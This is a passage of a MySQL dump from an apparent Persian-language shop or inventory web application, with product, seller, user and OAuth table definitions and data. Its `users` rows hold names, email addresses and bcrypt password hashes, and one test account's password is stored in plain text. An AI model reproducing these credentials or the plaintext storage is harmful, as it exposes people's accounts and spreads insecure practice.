  `value` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `ProductProperty`
--

INSERT INTO `ProductProperty` (`id`, `product`, `property`, `value`, `created_at`, `updated_at`, `deleted_at`) VALUES
(5, 19, 3, '12', NULL, NULL, NULL),
(6, 19, 4, 'Test', NULL, NULL, NULL),
(7, 24, 3, '12', NULL, NULL, NULL),
(8, 24, 4, 'Test', NULL, NULL, NULL),
(9, 1, 3, '12', NULL, '2017-06-28 19:26:14', '2017-06-28 19:26:14'),
(10, 1, 4, 'Test', NULL, '2017-06-28 19:26:14', '2017-06-28 19:26:14'),
(11, 1, 4, '123', NULL, '2017-06-28 19:26:14', '2017-06-28 19:26:14'),
(12, 1, 3, 'test', NULL, '2017-06-28 19:26:14', '2017-06-28 19:26:14'),
(13, 3, 7, 'test', NULL, '2017-06-28 19:16:17', '2017-06-28 19:16:17'),
(14, 3, 6, 'test', NULL, '2017-06-28 19:16:17', '2017-06-28 19:16:17'),
(15, 3, 5, 'test', NULL, '2017-06-28 19:16:17', '2017-06-28 19:16:17'),
(16, 2, 4, 'test', NULL, NULL, NULL),
(17, 2, 3, 'tset', NULL, NULL, NULL),
(18, 1, 4, 'test', NULL, '2017-06-29 01:35:23', '2017-06-29 01:35:23'),
(19, 1, 3, 'test', NULL, '2017-06-29 01:35:23', '2017-06-29 01:35:23'),
(20, 29, 3, '12', NULL, NULL, NULL),
(21, 29, 4, 'Test', NULL, NULL, NULL),
(22, 1, 4, 'test', NULL, '2017-06-29 01:51:51', '2017-06-29 01:51:51'),
(23, 1, 3, 'test', NULL, '2017-06-29 01:51:51', '2017-06-29 01:51:51'),
(24, 1, 4, '12', NULL, '2017-06-29 01:54:18', '2017-06-29 01:54:18'),
(25, 1, 3, 'green', NULL, '2017-06-29 01:54:18', '2017-06-29 01:54:18'),
(26, 1, 4, 'sdsd', NULL, '2017-06-29 01:56:07', '2017-06-29 01:56:07'),
(27, 1, 3, 're', NULL, '2017-06-29 01:56:07', '2017-06-29 01:56:07'),
(28, 1, 4, 'test', NULL, '2017-06-29 02:01:53', '2017-06-29 02:01:53'),
(29, 1, 3, 'test', NULL, '2017-06-29 02:01:53', '2017-06-29 02:01:53'),
(30, 1, 4, '12', NULL, '2017-06-29 02:03:02', '2017-06-29 02:03:02'),
(31, 1, 3, 'green', NULL, '2017-06-29 02:03:02', '2017-06-29 02:03:02'),
(32, 1, 4, '12', NULL, '2017-06-29 02:04:25', '2017-06-29 02:04:25'),
(33, 1, 3, 'red', NULL, '2017-06-29 02:04:25', '2017-06-29 02:04:25'),
(34, 1, 3, 'yellow', NULL, NULL, NULL),
(35, 1, 4, '12', NULL, NULL, NULL),
(36, 31, 8, '12', NULL, '2017-06-30 00:31:01', '2017-06-30 00:31:01'),
(37, 31, 4, '14', NULL, '2017-06-30 00:31:01', '2017-06-30 00:31:01'),
(38, 31, 3, 'green', NULL, '2017-06-30 00:31:01', '2017-06-30 00:31:01'),
(39, 32, 8, 'sds', NULL, '2017-06-29 23:11:08', '2017-06-29 23:11:08'),
(40, 32, 8, 'sdsd', NULL, '2017-06-29 23:23:58', '2017-06-29 23:23:58'),
(41, 33, 3, 'green', NULL, '2017-06-29 23:13:59', '2017-06-29 23:13:59'),
(42, 33, 3, 'green', NULL, NULL, NULL),
(43, 32, 3, 'test', NULL, '2017-06-29 23:30:33', '2017-06-29 23:30:33'),
(44, 32, 3, 'test', NULL, '2017-06-29 23:33:52', '2017-06-29 23:33:52'),
(45, 32, 3, 'test', NULL, '2017-06-29 23:34:30', '2017-06-29 23:34:30'),
(46, 32, 3, 'test', NULL, '2017-06-29 23:35:23', '2017-06-29 23:35:23'),
(47, 32, 3, 'test', NULL, '2017-06-29 23:36:12', '2017-06-29 23:36:12'),
(48, 32, 3, 'test', NULL, '2017-06-29 23:36:25', '2017-06-29 23:36:25'),
(49, 32, 3, 'test', NULL, NULL, NULL),
(50, 31, 3, 'test', NULL, NULL, NULL),
(51, 36, 3, 'یسبی', NULL, '2017-06-30 17:35:49', '2017-06-30 17:35:49'),
(52, 36, 3, 'یسبی', NULL, '2017-06-30 17:36:34', '2017-06-30 17:36:34'),
(53, 36, 3, 'test', NULL, '2017-06-30 17:36:56', '2017-06-30 17:36:56'),
(54, 37, 3, 'test', NULL, '2017-06-30 17:47:38', '2017-06-30 17:47:38'),
(55, 37, 3, 'green', NULL, '2017-06-30 17:52:55', '2017-06-30 17:52:55'),
(56, 36, 4, 'بزرگ', NULL, '2017-06-30 18:47:14', '2017-06-30 18:47:14'),
(57, 36, 3, 'ابی', NULL, '2017-06-30 18:47:14', '2017-06-30 18:47:14'),
(58, 36, 4, 'بزرگ', NULL, NULL, NULL),
(59, 36, 3, 'ابی', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `Property`
--

CREATE TABLE `Property` (
  `id` int(10) UNSIGNED NOT NULL,
  `subcategory` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `Property`
--

INSERT INTO `Property` (`id`, `subcategory`, `name`, `created_at`, `updated_at`, `deleted_at`) VALUES
(3, 1, 'رنگ', NULL, NULL, NULL),
(4, 1, 'سایز', NULL, NULL, NULL),
(5, 2, 'test', '2017-06-27 21:04:37', '2017-06-27 21:04:37', NULL),
(6, 2, 'test2', '2017-06-28 06:17:43', '2017-06-28 06:17:43', NULL),
(7, 2, 'test3', '2017-06-28 19:06:12', '2017-06-28 19:06:12', NULL),
(8, 1, 'test', '2017-06-29 22:24:22', '2017-06-29 22:24:22', NULL),
(9, 1, 'محکم', '2017-06-30 17:33:17', '2017-06-30 17:33:17', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `Sellers`
--

CREATE TABLE `Sellers` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `Sellers`
--

INSERT INTO `Sellers` (`id`, `name`, `deleted_at`) VALUES
(1, 'تهران', NULL),
(2, 'خرم آباد', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `SubCategory`
--

CREATE TABLE `SubCategory` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `category` int(10) UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `SubCategory`
--

INSERT INTO `SubCategory` (`id`, `name`, `category`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 'شلوار', 1, NULL, NULL, NULL),
(2, 'test', 2, '2017-06-27 20:59:28', '2017-06-27 20:59:28', NULL),
(4, 'test', 2, '2017-06-29 22:17:31', '2017-06-29 22:17:31', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(10) UNSIGNED NOT NULL,
  `fname` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `lname` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `type` int(10) UNSIGNED NOT NULL DEFAULT '4',
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `remember_token` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `fname`, `lname`, `type`, `email`, `password`, `remember_token`, `created_at`, `updated_at`, `deleted_at`) VALUES
(1, 'Alireza', 'Karami', 1, 'alitm28@gmail.com', '$2y$10$LEyX7VFQxSMqqu4KKrfZBuYmpdyQLcAZzl0eYC/3YRCkkLhBjxRqq', NULL, NULL, NULL, NULL),
(2, 'Mohammad', 'Sepahvand', 2, 'mohammad@gmail.com', '$2y$10$wxsAc.3TbVmvsItKSN9b6.ZUZAFUt8U0ypBTmZNC8dCyjCL/bMcca', NULL, NULL, NULL, NULL),
(3, 'Ali', 'Hakimi', 3, 'ali@gmail.com', '$2y$10$7bQVEog4tZAmrEB989KCYOisqyo0.LxluV/VfEnYCPmNhgUwIFgoS', NULL, NULL, NULL, NULL),
(4, 'Mehrdad', 'Rahmati', 4, 'mehrdad@gmail.com', '$2y$10$LyTzFHmwvxsG6QkLWF/eDexpDh4Lt2bX/So4cDCi7jwR.RvCwgQJ6', NULL, NULL, NULL, NULL),
(5, 'test', 'test', 3, 'test', 'test', NULL, '2017-06-28 11:49:14', '2017-06-28 11:49:14', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `userTypes`
--

CREATE TABLE `userTypes` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `userTypes`
--

INSERT INTO `userTypes` (`id`, `name`, `deleted_at`) VALUES
(1, 'admin', NULL),
(2, 'stockman', NULL),
(3, 'accountant', NULL),
(4, 'seller', NULL);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `Category`
--
ALTER TABLE `Category`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `Expense`
--
ALTER TABLE `Expense`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `Factors`
--
ALTER TABLE `Factors`
  ADD PRIMARY KEY (`id`),
  ADD KEY `factors_seller_foreign` (`seller`);

--
-- Indexes for table `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `oauth_access_tokens`
--
ALTER TABLE `oauth_access_tokens`
  ADD PRIMARY KEY (`id`),
  ADD KEY `oauth_access_tokens_user_id_index` (`user_id`);

--
-- Indexes for table `oauth_auth_codes`
--
ALTER TABLE `oauth_auth_codes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `oauth_clients`
--
ALTER TABLE `oauth_clients`
  ADD PRIMARY KEY (`id`),
  ADD KEY `oauth_clients_user_id_index` (`user_id`);

--
-- Indexes for table `oauth_personal_access_clients`
--
ALTER TABLE `oauth_personal_access_clients`
  ADD PRIMARY KEY (`id`),
  ADD KEY `oauth_personal_access_clients_client_id_index` (`client_id`);

--
-- Indexes for table `oauth_refresh_tokens`
--
ALTER TABLE `oauth_refresh_tokens`
  ADD PRIMARY KEY (`id`),
  ADD KEY `oauth_refresh_tokens_access_token_id_index` (`access_token_id`);

--
-- Indexes for table `Order`
--
ALTER TABLE `Order`
  ADD PRIMARY KEY (`id`),
  ADD KEY `order_orderfactor_foreign` (`orderFactor`),
  ADD KEY `product` (`product`);

--
-- Indexes for table `OrderFactor`
--
ALTER TABLE `OrderFactor`
  ADD PRIMARY KEY (`id`),
  ADD KEY `orderfactor_status_foreign` (`status`);

--
-- Indexes for table `OrderStatus`
--
ALTER TABLE `OrderStatus`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_resets`
--
ALTER TABLE `password_resets`
  ADD KEY `password_resets_email_index` (`email`);

--
-- Indexes for table `Product`
--
ALTER TABLE `Product`
  ADD PRIMARY KEY (`code`),
  ADD KEY `product_factor_foreign` (`factor`),
  ADD KEY `product_category_foreign` (`category`),
  ADD KEY `product_subcategory_foreign` (`subcategory`);

--
-- Indexes for table `ProductProperty`
--
ALTER TABLE `ProductProperty`
  ADD PRIMARY KEY (`id`),
  ADD KEY `productproperty_property_foreign` (`property`),
  ADD KEY `product` (`product`);

--
-- Indexes for table `Property`
--
ALTER TABLE `Property`
  ADD PRIMARY KEY (`id`),
  ADD KEY `property_subcategory_foreign` (`subcategory`);

--
-- Indexes for table `Sellers`
--
ALTER TABLE `Sellers`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `SubCategory`
--
ALTER TABLE `SubCategory`
  ADD PRIMARY KEY (`id`),
  ADD KEY `subcategory_category_foreign` (`category`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`),
  ADD KEY `users_type_foreign` (`type`);

--
-- Indexes for table `userTypes`
--
ALTER TABLE `userTypes`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `Category`
--
ALTER TABLE `Category`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
--
-- AUTO_INCREMENT for table `Expense`
--
ALTER TABLE `Expense`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
--
-- AUTO_INCREMENT for table `Factors`
--
ALTER TABLE `Factors`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=33;
--
-- AUTO_INCREMENT for table `logs`
--
ALTER TABLE `logs`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;
--
-- AUTO_INCREMENT for table `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;
--
-- AUTO_INCREMENT for table `oauth_clients`
--
ALTER TABLE `oauth_clients`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;
--
-- AUTO_INCREMENT for table `oauth_personal_access_clients`
--
ALTER TABLE `oauth_personal_access_clients`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `Order`
--
ALTER TABLE `Order`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=14;
--
-- AUTO_INCREMENT for table `OrderFactor`
--
ALTER TABLE `OrderFactor`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;
--
-- AUTO_INCREMENT for table `OrderStatus`
--
ALTER TABLE `OrderStatus`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT for table `Product`
--
ALTER TABLE `Product`
  MODIFY `code` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;
--
-- AUTO_INCREMENT for table `ProductProperty`
--
ALTER TABLE `ProductProperty`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=60;
--
-- AUTO_INCREMENT for table `Property`
--
ALTER TABLE `Property`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;
--
-- AUTO_INCREMENT for table `Sellers`
--
ALTER TABLE `Sellers`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;
--
-- AUTO_INCREMENT for table `SubCategory`
--
ALTER TABLE `SubCategory`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;
--
-- AUTO_INCREMENT for table `userTypes`
--
ALTER TABLE `userTypes`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;
--
-- Constraints for dumped tables
--

--
-- Constraints for table `Factors`
--
ALTER TABLE `Factors`
  ADD CONSTRAINT `factors_seller_foreign` FOREIGN KEY (`seller`) REFERENCES `Sellers` (`id`);

--
-- Constraints for table `Order`
--
ALTER TABLE `Order`
  ADD CONSTRAINT `Order_ibfk_1` FOREIGN KEY (`product`) REFERENCES `Product` (`code`),
  ADD CONSTRAINT `order_orderfactor_foreign` FOREIGN KEY (`orderFactor`) REFERENCES `OrderFactor` (`id`);

--
-- Constraints for table `OrderFactor`
--
ALTER TABLE `OrderFactor`
  ADD CONSTRAINT `orderfactor_status_foreign` FOREIGN KEY (`status`) REFERENCES `OrderStatus` (`id`);

--
-- Constraints for table `Product`
--
ALTER TABLE `Product`
  ADD CONSTRAINT `product_category_foreign` FOREIGN KEY (`category`) REFERENCES `Category` (`id`),
  ADD CONSTRAINT `product_factor_foreign` FOREIGN KEY (`factor`) REFERENCES `Factors` (`id`),
  ADD CONSTRAINT `product_subcategory_foreign` FOREIGN KEY (`subcategory`) REFERENCES `SubCategory` (`id`);

--
-- Constraints for table `ProductProperty`
--
ALTER TABLE `ProductProperty`
  ADD CONSTRAINT `ProductProperty_ibfk_1` FOREIGN KEY (`product`) REFERENCES `Product` (`code`),
  ADD CONSTRAINT `productproperty_property_foreign` FOREIGN KEY (`property`) REFERENCES `Property` (`id`);

--
-- Constraints for table `Property`
--
ALTER TABLE `Property`
  ADD CONSTRAINT `property_subcategory_foreign` FOREIGN KEY (`subcategory`) REFERENCES `SubCategory` (`id`);

--
-- Constraints for table `SubCategory`
--
ALTER TABLE `SubCategory`
  ADD CONSTRAINT `subcategory_category_foreign` FOREIGN KEY (`category`) REFERENCES `Category` (`id`);

--
-- Constraints for table `users`
--
ALTER TABLE `users`
  ADD CONSTRAINT `users_type_foreign` FOREIGN KEY (`type`) REFERENCES `userTypes` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
